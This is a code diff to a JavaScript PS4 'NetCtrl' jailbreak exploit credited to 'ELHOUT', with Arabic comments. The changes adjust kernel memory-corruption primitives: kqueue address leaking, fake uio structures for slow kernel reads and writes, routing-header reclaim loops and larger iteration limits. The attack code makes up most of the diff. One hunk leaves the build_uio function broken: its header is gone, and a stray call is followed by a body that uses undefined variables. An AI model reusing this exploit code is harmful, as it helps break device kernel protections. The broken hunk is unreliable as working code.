@@ -6,12 +6,10 @@ if (typeof libc_addr === 'undefined') {
 include('kernel.js');
 include('binloader.js');
 
-// ==========================
-// NetCtrl exploit
-// ==========================
-var _ACTIVE = false;
-var _LAST_TICK = Date.now();
-
+/* ===========================
+  *   NetCtrl exploit
+  * ===========================
+  */
 // Polyfill for padStart (older JS engines)
 if (!String.prototype.padStart) {
   String.prototype.padStart = function padStart(targetLength, padString) {
@@ -610,6 +608,7 @@ function wait_for(addr, threshold, label) {
   */
 
 function init() {
+  setup_log_screen();
   log('====mz==== PS4 Magic NetCtrl Jailbreak ====mz====');
   log('                          By ELHOUT');
   log('build: stable-clean (no crash)');
@@ -643,7 +642,12 @@ function init() {
   *   Setup
   * ===========================
   */
-
+// قبل setup_log_screen
+if (typeof _log === 'undefined') {
+  var _log = function (msg) {
+    try { ws.broadcast(msg); } catch (e) {}
+  };
+}
 var prev_core = -1;
 var prev_rtprio = -1;
 var cleanup_called = false;
@@ -797,6 +801,13 @@ function cleanup() {
   *   Logging Screen
   * ===========================
   */
+
+function init_threading() {
+  var jmpbuf = malloc(0x60);
+  setjmp(jmpbuf);
+  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
+  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
+}
 var LOG_MAX_LINES = 38;
 var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
 function setup_log_screen() {
@@ -818,12 +829,12 @@ function setup_log_screen() {
   }
   var logLines = [];
   var logBuf = [];
-  for (var _i9 = 0; _i9 < LOG_MAX_LINES; _i9++) {
+  for (var _i10 = 0; _i10 < LOG_MAX_LINES; _i10++) {
     var line = new jsmaf.Text();
     line.text = '';
-    line.style = 'log' + _i9 % LOG_COLORS.length;
+    line.style = 'log' + _i10 % LOG_COLORS.length;
     line.x = 20;
-    line.y = 120 + _i9 * 20;
+    line.y = 120 + _i10 * 20;
     jsmaf.root.children.push(line);
     logLines.push(line);
   }
@@ -831,14 +842,13 @@ function setup_log_screen() {
     if (screen) {
       logBuf.push(msg);
       if (logBuf.length > LOG_MAX_LINES) logBuf.shift();
-      for (var _i0 = 0; _i0 < LOG_MAX_LINES; _i0++) {
-        logLines[_i0].text = _i0 < logBuf.length ? logBuf[_i0] : '';
+      for (var _i11 = 0; _i11 < LOG_MAX_LINES; _i11++) {
+        logLines[_i11].text = _i11 < logBuf.length ? logBuf[_i11] : '';
       }
     }
     ws.broadcast(msg);
   };
 }
-
 /* ===========================
   *   Twins Finder
   * ===========================
@@ -1441,7 +1451,7 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
   while (count < KQUEUE_ITERATIONS) {
-    if (count % 300 === 0) {
+    if (count % 1000 === 0) {
       log('[LEAK] Progress iteration=' + count);
     }
     kq = kqueue();
@@ -1455,7 +1465,10 @@ function leak_kqueue() {
     get_rthdr(sd0, leak_rthdr, 0x100);
     var cur_magic = read64(magic_add);
     var cur_fdp = read64(leak_rthdr.add(0x98));
-    log('[LEAK] iter=' + count + ' magic=' + hex(cur_magic) + ' fdp=' + hex(cur_fdp));
+
+    if (count % 1000 === 0) {
+      debug('[LEAK] iter=' + count + ' magic=' + hex(cur_magic) + ' fdp=' + hex(cur_fdp));
+    }
     if (cur_magic.eq(magic_val) && !cur_fdp.eq(0)) {
       log('[LEAK] Pattern matched, breaking loop');
       break;
@@ -1514,20 +1527,26 @@ function kreadslow64_safe(address) {
   }
   return read64(buffer);
 }
-function build_uio(uio, uio_iov, uio_td, read, addr, size) {
+
+// بعد ما تجيب uio_iov من leak_rthdr مش محتاجه هنا
+// var uio_iov = read64(leak_rthdr);
+
+// استخدم uio_buf self-contained
+build_uio(uio_buf, 0, true, addr, size);
+  var iov_addr = uio.add(0x30);            // مكان أول iovec جوه نفس البافر
+
   // struct uio
-  write64(uio.add(0x00), uio_iov);          // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM);      // uio_iovcnt
-  write64(uio.add(0x10), BigInt_Error);     // uio_offset (زي الأصلي)
-  write64(uio.add(0x18), size);             // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE);     // uio_segflg
-  // مهم: نفس منطق الأصلي (read ? UIO_WRITE : UIO_READ)
+  write64(uio.add(0x00), iov_addr);        // uio_iov = &uio[0x30]
+  write64(uio.add(0x08), UIO_IOV_NUM);     // uio_iovcnt
+  write64(uio.add(0x10), BigInt_Error);    // uio_offset
+  write64(uio.add(0x18), size);            // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE);    // uio_segflg
   write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
-  write64(uio.add(0x28), uio_td);           // uio_td
+  write64(uio.add(0x28), uio_td);          // uio_td
 
   // أول iovec
-  write64(uio.add(0x30), addr);             // iov_base
-  write64(uio.add(0x38), size);             // iov_len
+  write64(iov_addr.add(0x00), addr);       // iov_base
+  write64(iov_addr.add(0x08), size);       // iov_len
 }
 function kreadslow(addr, size) {
   debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);
@@ -1579,7 +1598,7 @@ function kreadslow(addr, size) {
       zeroMemoryCount = 0;
     }
     count++;
-    if (count % 300 === 0) {
+    if (count % 1000 === 0) {
       log('[KR] Stage1 progress=' + count);
     }
 
@@ -1617,9 +1636,8 @@ function kreadslow(addr, size) {
   var zeroMemoryCount2 = 0;
   while (true) {
     count2++;
-    if (count2 > 6000) {
+    if (count2 > 10000) {
       log('[KR] Stage2 failed after max iterations');
-      // زي الأصلي: قبل ما نرجع Error ننضف iov loop لو لسه شغّال
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
@@ -1726,11 +1744,11 @@ function kwriteslow(addr, buffer, size) {
       zeroMemoryCount = 0;
     }
 
-    if (count % 300 === 0) {
+    if (count % 1000 === 0) {
       log('[KW] Stage1 progress=' + count);
     }
     count++;
-    if (count > 6000) {
+    if (count > 10000) {
       log('[KW] Stage1 failed after max iterations');
       return BigInt_Error;
     }
@@ -1751,9 +1769,9 @@ function kwriteslow(addr, buffer, size) {
 
   var uio_iov = read64(leak_rthdr);
 
-  // برضه هنا استخدم msgIov زي الأصلي
-  build_uio(uio_buf, uio_iov, 0, false, addr, size);  // write = false
+  // var uio_iov = read64(leak_rthdr);
 
+  build_uio(uio_buf, 0, false, addr, size);
   // Stage2: reclaim iov
   free_rthdr(ipv6_socks[triplets[2]]);
   var iov_leak_add = leak_rthdr.add(0x20);
@@ -1770,12 +1788,12 @@ function kwriteslow(addr, buffer, size) {
       zeroMemoryCount2 = 0;
     }
 
-    if (count2 % 300 === 0) {
+    if (count2 % 1000 === 0) {
       log('[KW] Stage2 progress=' + count2);
       
     }
     count2++;
-    if (count2 > 6000) {
+    if (count2 > 10000) {
       log('[KW] Stage2 failed after max iterations');
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
